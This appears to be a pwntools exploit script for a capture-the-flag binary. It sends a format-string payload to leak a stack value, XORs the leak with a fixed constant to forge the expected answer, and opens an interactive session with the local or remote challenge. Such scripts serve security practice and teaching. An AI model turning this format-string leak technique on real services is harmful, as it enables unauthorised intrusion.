from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './chall/app'
nc = 'nc 127.0.0.1 1337'
elf = context.binary = ELF(binary)
libc = elf.libc
gdbscript = """
	b * main
	c
"""

if len(sys.argv) == 1: p = process(binary)
elif sys.argv[1] == 'd': p = gdb.debug(binary, gdbscript)
elif sys.argv[1] == 'r': p = remote(nc.split(' ')[1], int(nc.split(' ')[2]))
else: p = process(binary); util.proc.wait_for_debugger(util.proc.pidof(p)[0])

p.sendlineafter(b'Hello, feeling lucky? ', b'%16$p')
leak = int(p.recvuntil(b'?!')[2:-2].decode(), 16)
fakme = leak ^ 0x1337c0dedeadbeef
p.sendline(str(fakme).encode())

p.interactive()
